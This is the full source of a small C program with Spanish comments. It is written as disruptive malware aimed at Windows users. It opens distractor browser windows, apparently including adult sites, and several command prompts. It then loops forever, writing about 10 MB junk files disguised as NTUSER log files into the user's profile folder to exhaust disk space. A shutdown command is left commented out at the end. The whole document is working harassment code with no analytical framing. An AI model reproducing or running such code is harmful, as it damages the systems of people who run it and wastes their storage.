#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <string.h>
 
main()
{
    long i;
    FILE *NOM;
    int j;
    char nomArch[100],nom[55];  
    //Obtenemos la direccion del usuario
    sprintf( nom,getenv("userprofile") ); 
    //Abrimos distractores
    system("start http://www.culosenpompa.com/");
    system("start http://www.google.com.mx/#hl=es&source=hp&biw=1366&bih=667&q=como+bajar+de+peso&aq=1&aqi=g10&aql=&oq=como+b&gs_rfai=&fp=1a0c12aba21f23fb");
    system("start http://www.culotetas.com/");
    system("start cmd");
    system("start cmd");
    system("start cmd");
    system("start cmd");
    system("start cmd");
    //
    for( i=0;;i++ )//Ciclo infinito
    {
	 	 
	 	 //Si ya se han creado al menos 10 archivos (mas de 100 mb de memoria) q abra una ventana de msdos
	 	 if(i%10==0)
	 	       system("start cmd");
	 	       
	 	 //Para que creen los archivos necesitamos recordarle la ruta con el nombre de archivo indexado     
         sprintf( nom,getenv("userprofile") ); 
         sprintf( nomArch,"\\NTUSER-%d-.log",i );
         strcat( nom,nomArch );
         
         NOM = fopen( nom,"w+" );
         //Ciclo que llena de basura un archivo
         for(j=0;j<=99999;j++)
         {                                       
	         fprintf(NOM,"!@&8*FFFFFF; @ECHO {1E9FC1%d8-651D-494-97BE-E53CAE5C7D4%d}",i,i);
	         fprintf(NOM,"-------------@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
	         fprintf(NOM,"\n");
 		 }
         fclose( NOM );
    }  
    //Si el sistema aguanto entonces que se apague
    //system("shutdown -s -t 0 Adios");
}
